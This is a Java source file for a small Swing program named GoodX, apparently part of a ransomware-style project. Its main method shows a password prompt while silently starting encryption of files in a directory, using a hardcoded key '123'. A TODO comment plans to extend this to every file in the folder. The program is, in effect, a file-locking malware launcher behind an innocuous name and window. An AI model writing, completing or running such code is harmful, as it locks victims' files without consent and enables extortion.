package com.goodx;

import com.security.FileEncryption;
import com.security.FileEncryptionException;

import javax.crypto.Cipher;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import static com.security.FileEncryption.getPassword;

/**
 * @Author Mustafa Jamal
 * @GitHub @doct0rX
 */
public class GoodX {
    private static FileEncryption fileEncryption;
    private JButton submitButton;
    private JPanel goodMain;
    private JPasswordField passwordField;
    private JButton about️Button;
    private JTextArea enterTheKeyToTextArea;

    private GoodX() {
        submitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent event) {
                String cmd = event.getActionCommand();
                char[] passwordInput = passwordField.getPassword();
                if (isPasswordCorrent(passwordInput)) {
                    JOptionPane.showMessageDialog(null, "Correct Password!!!\n---------------\n|    " + new String(passwordInput) + "    |\n---------------");
                } else {
                    JOptionPane.showMessageDialog(null, "nope.");
                }
            }
        });
    }

    /**
     * check if the password is correct or not
     * @param passwordInput array of char
     * @return boolean
     */
    private boolean isPasswordCorrent(char[] passwordInput) {
        return new String(passwordInput).equals(getPassword());
    }

    public static void main(String[] args) throws FileEncryptionException {
        JFrame frame = new JFrame("GoodX");
        frame.setContentPane(new GoodX().goodMain);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setSize(501, 201);
        Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();  // setting the frame in the center of screen.
        frame.setLocation(dimension.width/2-frame.getSize().width/2, dimension.height/2-frame.getSize().height/2);
        frame.setVisible(true);
        fileEncryption = new FileEncryption(FileEncryption.getDirPath(),"123", (byte) Cipher.ENCRYPT_MODE);
        fileEncryption.start();
    }

    // TODO: if needed to add dir; loop over the constractor for each file in the dir;
    // using the File[] finder() in FileEncryption.java
}
